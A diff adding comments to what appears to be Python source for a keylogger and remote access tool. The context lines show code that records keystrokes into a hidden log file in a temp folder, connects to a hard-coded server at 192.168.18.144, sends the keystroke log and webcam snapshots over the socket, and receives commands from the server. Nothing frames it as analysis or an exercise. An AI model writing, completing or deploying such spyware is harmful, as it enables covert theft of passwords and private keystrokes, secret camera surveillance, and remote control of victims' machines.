@@ -15,15 +15,18 @@ import cv2
 import pyautogui
 from pynput.keyboard import Listener
 
+# Global variables
 stop = False
 LOG_DIR_WINDOWS = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'logs')
 LOG_DIR_LINUX = '/tmp/logs'
 
 
+# Function to get the OS
 def get_os():
     return platform.system()
 
 
+# Function to create a connection to the server
 def create_connection(host, port):
     max_reconnect_time = 10 * 60
     reconnect_interval = 10
@@ -40,6 +43,7 @@ def create_connection(host, port):
             time.sleep(reconnect_interval)
 
 
+# Function to set up log file
 def setup_logging(filename):
     if not os.path.exists(os.path.dirname(filename)):
         os.makedirs(os.path.dirname(filename))
@@ -52,6 +56,7 @@ def setup_logging(filename):
     )
 
 
+# Function to hide file
 def hide_file(filename):
     if get_os() == 'Windows':
         ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
@@ -61,10 +66,12 @@ def hide_file(filename):
         print("OS not supported for hiding files.")
 
 
+# Function to log key press
 def log_key_press(key):
     logging.info(str(key))
 
 
+# Function to send log message
 def send_log_message(sock, filename):
     if not os.path.exists(filename):
         print(f"Log file not found: {filename}")
@@ -83,6 +90,7 @@ def send_log_message(sock, filename):
         print(f'Error sending log message: {e}')
 
 
+# Function to capture and send webcam image
 def capture_and_send_webcam(sock):
     cap = cv2.VideoCapture(0)
 
@@ -110,6 +118,7 @@ def capture_and_send_webcam(sock):
     cap.release()
 
 
+# Function to receive commands from server
 def receive_commands(sock):
     try:
         while True:
@@ -187,6 +196,7 @@ def receive_commands(sock):
         return
 
 
+# Main function
 def main():
     global stop
     host = '192.168.18.144'
